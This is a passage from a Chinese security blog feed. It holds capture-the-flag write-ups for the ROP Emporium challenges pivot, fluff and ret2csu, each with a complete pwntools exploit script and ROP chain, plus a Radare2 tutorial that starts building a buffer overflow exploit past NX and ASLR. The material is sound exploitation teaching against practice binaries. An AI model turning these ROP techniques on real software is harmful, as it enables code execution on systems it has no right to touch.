class="line">pop_rax             = p64(<span class="number">0x0000000000400b00</span>)</span><br><span class="line">xchg_rax_rsp        = p64(<span class="number">0x0000000000400b02</span>)</span><br><span class="line">mov_rax_mrax        = p64(<span class="number">0x0000000000400b05</span>)</span><br><span class="line">pop_rbp             = p64(<span class="number">0x0000000000400900</span>)</span><br><span class="line">add_rax_rbp         = p64(<span class="number">0x0000000000400b09</span>)</span><br><span class="line">call_rax            = p64(<span class="number">0x000000000040098e</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Addresses</span></span><br><span class="line"></span><br><span class="line">foothold_plt        = p64(<span class="number">0x00400850</span>)</span><br><span class="line">foothold_got        = p64(<span class="number">0x00602048</span>)</span><br><span class="line"></span><br><span class="line">pivot = process(<span class="string">&#x27;./pivot&#x27;</span>)</span><br><span class="line">heap_address = <span class="built_in">int</span>(pivot.recvline_contains(<span class="string">&#x27;The Old Gods kindly bestow upon you a place to pivot:&#x27;</span>).decode(<span class="string">&#x27;UTF-8&#x27;</span>).split(<span class="string">&#x27; &#x27;</span>)[-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_address))</span><br><span class="line"></span><br><span class="line">heap_address = p64(heap_address)</span><br><span class="line"></span><br><span class="line">pid = util.proc.pidof(pivot)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] PID = &quot;</span> + <span class="built_in">str</span>(pid))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Uncomment this if you want to use the debugger</span></span><br><span class="line"><span class="comment">#util.proc.wait_for_debugger(pid)</span></span><br><span class="line"></span><br><span class="line">second_stage = <span class="string">b&quot;&quot;</span></span><br><span class="line">second_stage += foothold_plt<span class="comment"># 调用foothold_function函数，调用时会将foothold_function函数的实际地址写入到GOT表中</span></span><br><span class="line">second_stage += pop_rax</span><br><span class="line">second_stage += foothold_got<span class="comment"># 将foothold_function函数的GOT地址写入eax寄存器</span></span><br><span class="line">second_stage += mov_rax_mrax<span class="comment"># 将foothold_function函数的GOT地址指向的地址放入eax寄存器，即foothold_function函数在内存中的真实地址</span></span><br><span class="line">second_stage += pop_rbp</span><br><span class="line">second_stage += p64(<span class="number">0x14e</span>)<span class="comment"># 将ret2win函数与foothold_function函数在libc.so文件中的相对偏移放入rbp</span></span><br><span class="line">second_stage += add_rax_rbp<span class="comment"># foothold_function函数真实地址加上ret2win相对于foothold_function函数的offset即得ret2win函数在内存中的实际地址</span></span><br><span class="line">second_stage += call_rax<span class="comment"># 使程序跳转到eax中的地址，即泄露的堆空间的入口位置</span></span><br><span class="line"></span><br><span class="line">pivot.recvuntil(<span class="string">&quot;Send your second chain now and it will land there&quot;</span>)</span><br><span class="line">pivot.sendline(second_stage)</span><br><span class="line"></span><br><span class="line">first_stage = <span class="string">b&quot;A&quot;</span> * <span class="number">40</span></span><br><span class="line">first_stage += pop_rax</span><br><span class="line">first_stage += heap_address<span class="comment"># 堆空间的地址放入rax寄存器</span></span><br><span class="line">first_stage += xchg_rax_rsp<span class="comment"># 交换eax和esp的值，也就是说程序分配的对空间就被当成栈，交换eax和esp的值，也就是说程序分配的堆空间就被当成栈，ret就会返回到栈顶去执行我们精心设计好的shellcode</span></span><br><span class="line"></span><br><span class="line">pivot.recvuntil(<span class="string">&quot;Now kindly send your stack smash&quot;</span>)</span><br><span class="line">pivot.sendline(first_stage)</span><br><span class="line"></span><br><span class="line">output = pivot.recvall()</span><br><span class="line"><span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure><h1 id="fluff"><a href="#fluff" class="headerlink" title="fluff"></a>fluff</h1><p> 先看一下基本信息</p><p>rabin2 -I fluff</p><p><img src="/.io//image-20240211153816683.png" alt="image-20240211153816683"></p><p>   然后载入r2分析</p><p>   r2 -AAA .&#x2F;fluff;afl</p><p><img src="/.io//image-20240211153910017.png" alt="image-20240211153910017"></p><p>分别看看pwnme和usefulFunction</p><p>   pdf @ sym.pwnme</p><p><img src="/.io//image-20240211153959924.png" alt="image-20240211153959924"></p><p>pdf @ sym.usefulFunction</p><p><img src="/.io//image-20240211154028720.png" alt="image-20240211154028720"></p><p>重复gdb调试过程，可以发现，esp偏移还是40。</p><p><img src="/.io//image-20240211154312428.png" alt="image-20240211154312428"></p><p> 然后使用ropgadget找到有用的gadget</p><p>   ROPgadget –binary fluff     </p><p>首先我们要找到一个gadget用于将字符串写入内存。mov适合的似乎只有下面这一条mov适合的似乎只有下面这一条</p><p><img src="/.io//image-20240211161130385.png" alt="image-20240211161130385"></p><p>如果用了这一条，那么下一个要解决的问题就是怎么将值写入r10、r11寄存器呢</p><p>似乎没有可直接写的办法，这时候我们常用的解决办法就是组合多个gadget以将值写入r10为例，我们看看该如何操作</p><p>那么这里就需要注意了，按照前面的默认命令，其实ropgadget的搜索深度是10。既然我们需要组合多个gadget，既然越多越多，所以我们可以加上–depth 20，将深度设为20</p><p>ROPgadget –binary fluff –depth 20</p><p>首先清空r11，有两个办法，要么置零，要么与自身异或</p><p>我们看看gadget里有没有符合的</p><p><img src="/.io//image-20240211161354176.png" alt="image-20240211161354176"></p><p>接下来把地址pop到r12里</p><p>对应的gadget为</p><p><img src="/.io//image-20240211161458563.png" alt="image-20240211161458563"></p><p>前面r11已经是0了，我们将r12与r11异或，这样其实就相当于间接地使用了mov，将值写入了r11</p><p><img src="/.io//image-20240211161618176.png" alt="image-20240211161618176"></p><p>然后使用xchg交换r11和r10寄存器的值，这样就相当于将地址写到了r10寄存器中</p><p><img src="/.io//image-20240211161740267.png" alt="image-20240211161740267"></p><p>做完这部分工作之后，我们只需pop rdi,ret，字符串的地址作为system（）参数传入，再调用system（）就可以了</p><p><img src="/.io//image-20240211161821012.png" alt="image-20240211161821012"></p><p>代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">place_address</span>(<span class="params">address</span>):</span><br><span class="line">    payload = p64(<span class="number">0x0000000000400822</span>) <span class="comment"># xor r11, r11; pop r14; mov edi, 0x601050; ret;</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) <span class="comment"># Unused pop r14</span></span><br><span class="line">    payload += p64(<span class="number">0x0000000000400832</span>) <span class="comment"># pop r12; mov r13d, 0x604060; ret;</span></span><br><span class="line">    payload += p64(address)</span><br><span class="line">    payload += p64(<span class="number">0x000000000040082f</span>) <span class="comment"># xor r11, r12; pop r12; mov r13d, 0x604060; ret;</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) <span class="comment"># Unused pop r12</span></span><br><span class="line">    payload += p64(<span class="number">0x0000000000400840</span>) <span class="comment"># xchg r11, r10; pop r15; mov r11d, 0x602050; ret;</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) <span class="comment"># Unused pop r15</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">place_data</span>(<span class="params">data</span>):</span><br><span class="line">    payload = p64(<span class="number">0x0000000000400822</span>) <span class="comment"># xor r11, r11; pop r14; mov edi, 0x601050; ret;</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) <span class="comment"># Unused pop r14</span></span><br><span class="line">    payload += p64(<span class="number">0x0000000000400832</span>) <span class="comment"># pop r12; mov r13d, 0x604060; ret;</span></span><br><span class="line">    payload += data <span class="comment"># String to be putted</span></span><br><span class="line">    payload += p64(<span class="number">0x000000000040082f</span>) <span class="comment"># xor r11, r12; pop r12; mov r13d, 0x604060; ret;</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) <span class="comment"># Unused pop r12</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_data</span>(<span class="params">string, address</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(string) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">          string += <span class="string">&quot;\x00&quot;</span></span><br><span class="line"></span><br><span class="line">    splitted_string = [string[i:i + <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(string), <span class="number">8</span>)]</span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(splitted_string)):</span><br><span class="line">        <span class="comment"># Put address into r10 register</span></span><br><span class="line">        payload += place_address(address + (i * <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Now we have to put actual data in r11</span></span><br><span class="line">        payload += place_data(splitted_string[i])</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Write data to address</span></span><br><span class="line">        payload += p64(<span class="number">0x000000000040084e</span>) <span class="comment"># mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret; </span></span><br><span class="line">        payload += p64(<span class="number">0</span>) * <span class="number">2</span> <span class="comment"># Unused pop r13 and pop r12</span></span><br><span class="line">         </span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">offset = cyclic(<span class="number">40</span>)</span><br><span class="line">offset += write_data(<span class="string">&quot;/bin/cat flag.txt&quot;</span>, <span class="number">0x601050</span>)</span><br><span class="line">offset += p64(<span class="number">0x00000000004008c3</span>)</span><br><span class="line">offset += p64(<span class="number">0x601050</span>)</span><br><span class="line">offset += p64(<span class="number">0x00400810</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(offset)</span><br></pre></td></tr></table></figure><p>python 6.py | .&#x2F;fluff</p><p><img src="/.io//image-20240211162051959.png" alt="image-20240211162051959"></p><h1 id="Ret2csu"><a href="#Ret2csu" class="headerlink" title="Ret2csu"></a>Ret2csu</h1><p><img src="/.io//image-20240211162149382.png" alt="image-20240211162149382"></p><p>没有合适的rop gadgets,该如何在没有pop rdx的情况下写入rdx呢</p><p>   先看一下基本信息</p><p>   rabin2 -I ret2csu</p><p><img src="/.io//image-20240211162543206.png" alt="image-20240211162543206"></p><p>   载入r2</p><p>   r2 -AAA ret2csu; afl</p><p><img src="/.io//image-20240211163059328.png" alt="image-20240211163059328"></p><p>看pwnme的反汇编</p><p>pdf @ sym.pwnme</p><p><img src="/.io//image-20240211163209150.png" alt="image-20240211163209150"></p><p>可以看到要求rdx必须是指定的字符串</p><p>ret2win</p><p><img src="/.io//image-20240211163259337.png" alt="image-20240211163259337"></p><p>我们先看看ropgadget</p><p>ROPgadget –binary ret2csu</p><p>可以看到和rdx相关的只有</p><p>ROPgadget –binary ret2csu | grep rdx</p><p><img src="/.io//image-20240211163409566.png" alt="image-20240211163409566"></p><p>没有pop rdx,或mov rdx</p><p>所以理论上我们无法绕过关卡的限制，无法设置该寄存器。</p><p>此时的解决方案是returnto csu,这是blackhat2018的议题，通过一个通用的gadget来制作rop</p><p>在afl命令的输出中我们看到有一个函数，名为__libc_csu_init。x64 下的 __libc_csu_init 这个函数是用来<code>对 libc 进行初始化操作的，而一般的程序用 libc 函数，所以这个函数一定会存在。</code> (不同版本的这个函数有一定的区别)<br>简单来说就是利用libc_csu_init中的两段代码片段来实现3个参数的传递（间接性的传递参数）</p><p>我们反汇编看看</p><p>   pdf @ sym.__libc_csu_init</p><p><img src="/.io//image-20240211163535575.png" alt="image-20240211163535575"></p><p>在其中我们找到了两个gadget</p><p>   第一个：</p><p><img src="/.io//image-20240211163549013.png" alt="image-20240211163549013"></p><p>第二个：</p><p><img src="/.io//image-20240211163603005.png" alt="image-20240211163603005"></p><p><img src="/.io//image-20240211163638146.png" alt="image-20240211163638146"></p><p><img src="/.io//image-20240211163645226.png" alt="image-20240211163645226"></p><p><img src="/.io//image-20240211163652676.png" alt="image-20240211163652676"></p><p> rdi是第一个参数，rsi是第二个参数，rdx是第三个参数</p><p>   结合这两个gadget我们知道，rdi来自r13,rsi来自r14,rdx来自r15</p><p>   前面提到我们要写0xdeadcafebabebeef到rdx,而从0x00400880可以看到写入r15就可以了。通过mov rdx,r15即可实现目的。</p><p>   但是我们注意到第一个问题是第二个gadget的最后一条不是ret,而是call</p><p>   call qword ptr [r12+rbx*8]，由前可知，r12,rbx都是可控的，所以这个地址是可控的，不过为了控制目的地我们需要rbx和r12，这具体的值是什么呢?</p><p>IDA注意到</p><p><img src="/.io//image-20240211163933378.png" alt="image-20240211163933378"></p><p> 第二个gadget后面是上图的三条指令</p><p>   在cmp之前，rbx+1了，所以简单起见，我们设置rbx为0，rbp为1，这样cmp得到的结果就是相等</p><p>   后面紧接着就是add rsp,8</p><p><img src="/.io//image-20240211164015414.png" alt="image-20240211164015414"></p><p>我们知道rsp 是堆栈指针寄存器，通常会指向栈顶位置，堆栈的 pop 和push 操作就是通过改变rsp 的值即移动堆栈指针的位置来实现的。</p><p>   这里的指令相当于增加了栈空间，我们可以随意填充相应大小即可。</p><p>   在上面我们设置了rbx为0，所以call的地址就是r12指定了，但是直接把ret2win的地址放入r12会报SIGSEGV。而为了有效地使用movrdx，r15，我们必须确保调用QWORD PTR [r12 + rbx * 8]不是SIGSEGV，cmp rbx，rbp相等且最重要的是RDX的值不会改变。</p><p>   根据这篇文章（<a href="https://www.voidsecurity.in/2013/07/some-gadget-sequence-for-x8664-rop.html%EF%BC%89%E6%8F%8F%E8%BF%B0%E7%9A%84%E6%8A%80%E5%B7%A7%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E5%B0%9D%E8%AF%95%E8%B0%83%E7%94%A8__init()%E5%87%BD%E6%95%B0%EF%BC%8C%E9%80%9A%E8%BF%87DYNAMIC%E5%8F%98%E9%87%8F%E5%AE%9A%E4%BD%8D">https://www.voidsecurity.in/2013/07/some-gadget-sequence-for-x8664-rop.html）描述的技巧，我们可以尝试调用__init()函数，通过DYNAMIC变量定位</a></p><p>   gdb ret2csu</p><p><img src="/.io//image-20240211164158953.png" alt="image-20240211164158953"></p><p> 因为__init使用0x400560地址，我们的指针就是0x600e30 + 8</p><p>这些操作完成后，我们就可以正常地在栈上放入ret2win的地址</p><p>   总结下我们做了哪些事情：</p><p>   首先调用第一个gadget，地址是0x40089a</p><p>   将需要的值放在栈上</p><p>   r12寄存器上是指向__init地址的指针</p><p>   r15寄存器是0xdeadcafebabebeef</p><p>   rbx寄存器是0x0</p><p>   rbp寄存器是0x1</p><p>   第二个gadget地址是0x400880</p><p>   因为有add rsp,8所以我们需要进行一些填充</p><p>   将ret2win的值放在栈上</p><p>代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ret2win_adr         = <span class="number">0x4007b1</span></span><br><span class="line">first_gadget_adr    = <span class="number">0x40089a</span></span><br><span class="line">second_gadget_adr   = <span class="number">0x400880</span></span><br><span class="line">init_pointer        = <span class="number">0x600e38</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>  * <span class="number">40</span></span><br><span class="line">payload += p64(first_gadget_adr)</span><br><span class="line">payload += p64(<span class="number">0x00</span>)            <span class="comment"># pop rbx</span></span><br><span class="line">payload += p64(<span class="number">0x01</span>)            <span class="comment"># pop rbp</span></span><br><span class="line">payload += p64(init_pointer)    <span class="comment"># pop r12</span></span><br><span class="line">payload += p64(<span class="number">0x00</span>)            <span class="comment"># pop r13</span></span><br><span class="line">payload += p64(<span class="number">0x00</span>)            <span class="comment"># pop r14</span></span><br><span class="line">payload += p64(<span class="number">0xdeadcafebabebeef</span>) <span class="comment"># pop r15</span></span><br><span class="line">payload += p64(second_gadget_adr)</span><br><span class="line">payload += p64(<span class="number">0x00</span>)            <span class="comment"># add rsp,0x8 padding</span></span><br><span class="line">payload += p64(<span class="number">0x00</span>)            <span class="comment"># rbx</span></span><br><span class="line">payload += p64(<span class="number">0x00</span>)            <span class="comment"># rbp</span></span><br><span class="line">payload += p64(<span class="number">0x00</span>)            <span class="comment"># r12</span></span><br><span class="line">payload += p64(<span class="number">0x00</span>)            <span class="comment"># r13</span></span><br><span class="line">payload += p64(<span class="number">0x00</span>)            <span class="comment"># r14</span></span><br><span class="line">payload += p64(<span class="number">0x00</span>)            <span class="comment"># r15</span></span><br><span class="line">payload += p64(ret2win_adr)</span><br><span class="line"></span><br><span class="line">ret2csu = process(<span class="string">&#x27;./ret2csu&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ret2csu.readuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret2csu.sendline(payload)</span><br><span class="line"></span><br><span class="line">output = ret2csu.readall()</span><br><span class="line"><span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Radare入门</title>
      <link href="/2024/03/01/Radare%E5%85%A5%E9%97%A8/"/>
      <url>/2024/03/01/Radare%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Radare入门到进阶"><a href="#Radare入门到进阶" class="headerlink" title="Radare入门到进阶"></a>Radare入门到进阶</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p>radare2是一个开源的逆向工程和二进制分析框架，包括反汇编、分析数据、打补丁、比较数据、搜索、替换、虚拟化等等，同时具备超强的脚本加载能力，它可以运行在几乎所有主流的平台（GNU&#x2F;Linux, .Windows *BSD, iOS, OSX, Solaris…）并且支持很多的cpu架构以及文件格式。 radare2工程是由一系列的组件构成，这些组件可以在 radare2 界面或者单独被使用–比如我们将要在接下来实验中使用到的rahash2, rabin2, ragg2三个组件，所有这些组件赋予了 radare2 强大的静态以及动态分析、十六进制编辑以及溢出漏洞挖掘的能力。</p><p>Kali已经自带radare2</p><p>我们可以输入-h查看帮助，i开头的命令主要用来获取各种信息，A系列的命令用于分析文件</p><p><img src="/.io//image-20240210115155347.png" alt="image-20240210115155347"></p><p><img src="/.io//image-20240210115210174.png" alt="image-20240210115210174"></p><p><img src="/.io//image-20240210115224693.png" alt="image-20240210115224693"></p><p>r2 框架里最强的一个工具 ：rabin2.</p><p>rabin2 可以获取包括ELF, PE, Mach-O, Java CLASS文件的区段、头信息、导入导出表、字符串相关、入口点等等，并且支持几种格式的输出文件.我们可以使用它来获取二进制文件的基本信息</p><p>输入man rabin2查看更多用法。对于反汇编，我们可以输入vv进入图形化界面。输入q则可以退出图形化界面，回到shell</p><h2 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h2><p>首先rabin2加上-I 参数 来让 rabin2 打印出二进制文件的系统属性、语言、字节序、框架、以及使用了哪些 加固技术</p><p><img src="/.io//image-20240210115622138.png" alt="image-20240210115622138"></p><p>我们可以看到这是一个32位的 elf 文件，没有剥离符号表并且是动态链接的</p><p>接下来我们尝试运行它</p><p><img src="/.io//image-20240210115723007.png" alt="image-20240210115723007"></p><p>可以看到，不论是否加参数都会显示wrong。</p><p>接下来我们使用radare2来进行破解。</p><p><img src="/.io//image-20240210115845205.png" alt="image-20240210115845205"></p><p>看到黄色字体输出了一个地址 (0x08048370)，这就是它自动识别的程序入口点，或者我们也可以使用ie命令手动打印出入口点。</p><p>接下来输入aa或者aaa进行细致的分析</p><p><img src="/.io//image-20240210115925640.png" alt="image-20240210115925640"></p><p>分析完成之后， r2会将所有有用的信息和特定的名字绑定在一起，比如区段、函数、符号、字符串，这些都被称作 ‘flags’, flags 被整合进 <flag spaces>，一个 flag 是所有类似特征的集合</flag></p><p>接下来我们看看所有的flag</p><p><img src="/.io//image-20240210115958812.png" alt="image-20240210115958812"></p><p>我们打印出imports下面的信息</p><p><img src="/.io//image-20240210120028466.png" alt="image-20240210120028466"></p><p>为了获取更多的信息，我们可以再列出数据段里的字符串</p><p><img src="/.io//image-20240210120055994.png" alt="image-20240210120055994"></p><p>出现了关键字，一个是success，一个是我们之前运行时的wrong….。那我们接下来就跟着success走，看看哪儿进行了调用</p><p>输入命令axt @@ str.*，并使用afl列出分析到的函数</p><p>‘axt’ 命令用来在 data&#x2F;code段里找寻某个地址相关的引用（更多的操作，请看 ‘ax?’）.</p><p>‘@@’就像一个迭代器，用来在地址空间里不断地匹配后面一系列相关的命令（更多操作，请看 ‘@@?’）</p><p>‘str.*’ 是一个通配符，用来标记所有以 ‘str.’开头的信息，不光会列出字符串标志，同时也包括函数名，找到它们到底在哪里以及何处被调用。</p><p>接下来我们看看radare2分析出来哪些函数</p><p><img src="/.io//image-20240210120506254.png" alt="image-20240210120506254"></p><p>看到两个引起我们注意的sym.beet和sym.rot13</p><p>接下来我们用 ‘s main’ 指令定位到main函数入口处，然后用 ‘pdf’输出反汇编代码</p><p><img src="/.io//image-20240210120612639.png" alt="image-20240210120612639"></p><p>分析函数的执行流程，我们知道二进制程序是通过获取 beet函数的返回结果来判断是否正确</p><p>输入<a href="mailto:&#112;&#100;&#x66;&#64;&#x73;&#x79;&#x6d;&#x2e;&#x62;&#101;&#101;&#x74;">&#112;&#100;&#x66;&#64;&#x73;&#x79;&#x6d;&#x2e;&#x62;&#101;&#101;&#x74;</a>定位到反汇编</p><p><img src="/.io//image-20240210120706294.png" alt="image-20240210120706294"></p><p><img src="/.io//image-20240210120834756.png" alt="image-20240210120834756"></p><p>我们看到输入的参数被拷贝到了一个缓存空间里，这个空间的地址是 ‘ebp – local_88h’ 。 ‘local_88h’ 就是十进制的 136。由于4个字节会被用来保存 ebp 的地址，4个字节被用来保存返回地址，所以这个缓冲区得大小是 128个字节.它们加起来刚好是 136. 我们输入的参数被拷贝到缓冲区后被用来和 sym.rot13的返回结果作对比， <strong>Rot-13</strong> 是一个著名的替换密码算法，在ctf和crackme中被广泛使用，这个函数接受了9个十六进制值作为参数，但是上图中看起来r2好像没有识别出来到底是什么字符，这里我们需要用 ‘ahi s’ 来做些处理。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ahi s @@=0x080485a3 0x080485ad 0x080485a7</span><br></pre></td></tr></table></figure><p>ahi s 是用来设置字符串特定的偏移地址（使用 ahi? 获取更多用法），@@是一个迭代器，可以用来接受后面输入的多个参数,执行完这条命令后，图形视图会自动刷新。重新运行<a href="mailto:&#x70;&#x64;&#102;&#x40;&#115;&#121;&#109;&#46;&#x62;&#101;&#101;&#116;">&#x70;&#x64;&#102;&#x40;&#115;&#121;&#109;&#46;&#x62;&#101;&#101;&#116;</a></p><p><img src="/.io//image-20240210121257193.png" alt="image-20240210121257193"></p><p>可以看到之前无法识别的字符串’Megabeets’(根据字节序反向压栈顺序得到)。这个二进制文件将我们传入的参数来和经过 rot13 处理后的 ‘Megabeets’ 作比较</p><p>接下来我们通过rahash2求出这个字符串的校验值</p><p><img src="/.io//image-20240210121407504.png" alt="image-20240210121407504"></p><p>至此，程序的逻辑就很清楚了：</p><p>‘Zrtnorrgf’ 就是用来和我们输入的字符串作比较，成功则返回success</p><p>接下来输入ood?进入调试模式</p><p>将Zrtnorrgf作为参数进行调试</p><p>输入dc查看结果</p><p><img src="/.io//image-20240210121546310.png" alt="image-20240210121546310"></p><p>输出了success，我们成功破解了这个小软件，也借此掌握了radare2的基本用法</p><h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2><p>常用命令：</p><p>   信息搜集:</p><p>​    $ rabin2 -I .&#x2F;program — 查看二进制信息</p><p>   ii [q] – 查看导出表</p><p>   ?v sym.imp.func_name — 获取过程链接表中相应函数的地址（func_name@PLT）</p><p>   ?v reloc.func_name —获取全局偏移表中函数的地址（func_name@GOT）</p><p>   ie [q] — 获取入口点地址</p><p>   内存相关：</p><p>   dmm — 列出模块 (库文件，内存中加载的二进制文件)</p><p>   dmi [addr|libname] [symname] — 列出目标库的符号标识</p><p>   搜索：</p><p>   &#x2F;?— 列出搜索子命令 </p><p>   &#x2F; string — 搜索内存&#x2F;二进制文件的字符串</p><p>   &#x2F;R [?] —搜索ROP gadgets</p><p>   &#x2F;R&#x2F; — 使用正则表达式搜索ROP gadgets</p><p>   调试：</p><p>   dc — 继续执行</p><p>   dcu addr – 继续执行直到到达指定地址</p><p>   dcr — 继续执行直到到达ret (使用步过step over)</p><p>   dbt [?] —基于 dbg.btdepth 和 dbg.btalgo显示backtrace追踪函数</p><p>   doo [args] — 添加参数重新打开调试模式</p><p>   ds — 步入一条指令（step on）</p><p>   dso — 步过（Step over）</p><p>Visual Modes</p><p>   pdf @ addr — 打印出相应偏移处的函数的汇编代码</p><p>   V —视图模式,使用p&#x2F;P to在不同模式间切换</p><p>本实验的重点是exp的开发，将使用radare 2绕过启用ASLR的系统上的NX保护的二进制文件，并进行exp的开发。</p><p>拿到小程序后，我们首先使用rabin2查看文件相关信息</p><p><img src="/.io//image-20240210122304648.png" alt="image-20240210122304648"></p><p>由上图可以看到二进制文件是NX保护的，这意味着我们不会有一个可执行的堆栈依赖。这就加大了我们写exp的难度，同样，这也给我们的学习与挑战带来了乐趣。</p><p>现在我们来看看程序的反汇编。我们先以调试模式打开，然后对符号、函数进行分析</p><p><img src="/.io//image-20240210122829057.png" alt="image-20240210122829057"></p><p> 接下来继续执行，直到到达main函数</p><p><img src="/.io//image-20240210122854521.png" alt="image-20240210122854521"></p><p>  接下来我们使用vv进入图形化模式</p><p><img src="/.io//image-20240210123817194.png" alt="image-20240210123817194"></p><p>   我们可以看到main()函数中通过scanf()帮助我们输入，然后将输入值传递给sym.beet，因此定位到处理我们输入的beet函数。按q退出vv模式</p><p><img src="/.io//image-20240210123158664.png" alt="image-20240210123158664"></p><p> 我们可以看到，用户的输入[arg_8h]被复制到了缓冲区[local_88h]，然后正如我们在上一个radare2入门实验中看到的一样,字符串Megabeets将会通过rot13加密，加密后的结果将会与我们的输入进行比较。</p><p>此处存在的漏洞是：程序不检查输入的大小，并将输入复制到缓冲区。这意味着，如果我们输入一个大于缓冲区大小的输入，就会导致缓冲区溢出并破坏堆栈</p><p>接下来我们来看看我们的exp该怎么编写。</p><p>   我们的目标是在系统上得到一个shell。首先，我们需要验证确实存在一个易受攻击的函数，然后，我们将找到有效负载覆盖堆栈的偏移量。</p><p>   我们使用radare2的一个框架ragg2, ragg2允许我们生成一个名为deBruijn序列的循环模式，并检查有效负载覆盖缓冲区的确切偏移量。</p><p><img src="/.io//image-20240210124026111.png" alt="image-20240210124026111"></p><p> 接下来我们要做三件事情：</p><p>   1.使用ragg2将De Bruijn模式的文件写入</p><p>   2.创建rarun2配置文件和设置输出文件作为标准输入</p><p>vim profile.rr2</p><p><img src="/.io//image-20240210124258237.png" alt="image-20240210124258237"></p><p>   3.让radare2自动找到偏移值</p><p><img src="/.io//image-20240210124743090.png" alt="image-20240210124743090"></p><p>我们执行了我们的二进制文件，并通过rarun2传递了pattern.txt的内容到stdin，并收到了信号量11</p><p><img src="/.io//image-20240210124819281.png" alt="image-20240210124819281"></p><p>我们注意到提示指向0x41417641？这是一个无效的地址，代表“AvAA”（ascii），这是我们前面生成的模式的一部分。</p><p><img src="/.io//image-20240210125135227.png" alt="image-20240210125135227"></p><p>由上图可以知道140个字节后将会出现返回地址的覆盖，我们可以开始制作我们的payload了。</p><p>前面提到我们的机器受ASLR保护所以我们不能预测地址，libc将加载到内存并且地址会发生变换。此外，我们的二进制程序开启NX，这意味着栈是不可执行的，我们不能仅仅把shellcode写入堆栈，跳转到它来执行。虽然这些保护阻止我们使用一些技术开发exp，但它们并不是绝对有效的，我们可以很容易地制造出其他的payload绕过它们</p><p>   我们再次以调试模式打开二进制文件，并查看库和它使用的函数。</p><p><img src="/.io//image-20240210125246324.png" 